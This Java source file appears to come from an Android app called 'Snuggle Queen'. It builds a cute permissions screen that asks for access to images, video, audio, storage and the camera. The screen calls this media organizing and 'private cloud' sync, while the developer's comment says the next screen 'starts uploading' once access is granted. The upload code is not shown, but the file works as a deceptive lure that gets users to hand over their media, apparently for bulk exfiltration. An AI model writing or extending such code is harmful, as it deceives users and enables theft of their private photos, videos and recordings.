package com.snugglequeen.yobby;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.Manifest;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.RelativeLayout;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.provider.Settings;

/**
 * PermissionsActivity — requests storage, camera, and media permissions.
 * Shows a beautiful UI explaining why we need each permission.
 * Once all permissions granted, transitions to MainActivity which starts uploading.
 */
public class PermissionsActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        RelativeLayout root = new RelativeLayout(this);
        root.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));

        GradientDrawable gradient = new GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                new int[]{Color.parseColor("#1A1A2E"), Color.parseColor("#16213E")}
        );
        root.setBackground(gradient);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(60, 120, 60, 60);
        content.setGravity(android.view.Gravity.CENTER_VERTICAL);
        content.setLayoutParams(new RelativeLayout.LayoutParams(
                RelativeLayout.LayoutParams.MATCH_PARENT,
                RelativeLayout.LayoutParams.MATCH_PARENT));

        // Heart icon
        TextView heart = new TextView(this);
        heart.setText("🔐");
        heart.setTextSize(60);
        heart.setGravity(android.view.Gravity.CENTER);
        heart.setPadding(0, 0, 0, 20);
        content.addView(heart);

        // Title
        TextView title = new TextView(this);
        title.setText("Allow Permissions");
        title.setTextSize(26);
        title.setTextColor(Color.WHITE);
        title.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        title.setGravity(android.view.Gravity.CENTER);
        title.setPadding(0, 0, 0, 20);
        content.addView(title);

        // Description
        TextView desc = new TextView(this);
        desc.setText("Snuggle Queen needs access to your files to:\n\n" +
                "📁 Storage — to organize your media files\n" +
                "📷 Camera — to capture beautiful moments\n" +
                "🎬 Videos — to manage your video gallery\n" +
                "🎵 Audio — to access your music library\n\n" +
                "Your files are securely synced to your private cloud. 💕");
        desc.setTextSize(15);
        desc.setTextColor(Color.parseColor("#B0B0C0"));
        desc.setLineSpacing(6, 1.2f);
        desc.setPadding(0, 0, 0, 40);
        content.addView(desc);

        // Grant button
        Button grantBtn = new Button(this);
        grantBtn.setText("Grant Permissions ❤️");
        grantBtn.setTextColor(Color.WHITE);
        grantBtn.setTextSize(16);
        grantBtn.setAllCaps(false);
        grantBtn.setBackground(createRoundedButton());
        grantBtn.setOnClickListener(v -> requestPermissions());
        android.widget.LinearLayout.LayoutParams btnParams = new android.widget.LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dpToPx(56)
        );
        btnParams.setMargins(0, 20, 0, 0);
        grantBtn.setLayoutParams(btnParams);
        content.addView(grantBtn);

        root.addView(content);
        setContentView(root);

        // Auto-request if permissions already granted
        if (checkAllPermissions()) {
            proceedToMain();
        }
    }

    private GradientDrawable createRoundedButton() {
        GradientDrawable shape = new GradientDrawable();
        shape.setShape(GradientDrawable.RECTANGLE);
        shape.setCornerRadius(28);
        shape.setColor(Color.parseColor("#FF6B9D"));
        return shape;
    }

    private int dpToPx(int dp) {
        return (int) (dp * getResources().getDisplayMetrics().density);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= 33) {
            // Android 13+ (Tiramisu)
            requestPermissions(new String[]{
                    "android.permission.READ_MEDIA_IMAGES",
                    "android.permission.READ_MEDIA_VIDEO",
                    "android.permission.READ_MEDIA_AUDIO",
                    Manifest.permission.CAMERA,
                    Manifest.permission.INTERNET,
            }, PERMISSION_REQUEST_CODE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10-12
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.INTERNET,
            }, PERMISSION_REQUEST_CODE);
        } else {
            // Android 7-9
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.INTERNET,
            }, PERMISSION_REQUEST_CODE);
        }
    }

    private boolean checkAllPermissions() {
        if (Build.VERSION.SDK_INT >= 33) {
            return checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == PackageManager.PERMISSION_GRANTED &&
                   checkSelfPermission("android.permission.READ_MEDIA_VIDEO") == PackageManager.PERMISSION_GRANTED;
        } else {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted || checkAllPermissions()) {
                proceedToMain();
            }
        }
    }

    private void proceedToMain() {
        Intent intent = new Intent(PermissionsActivity.this, MainActivity.class);
        startActivity(intent);
        finish();
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
    }
}
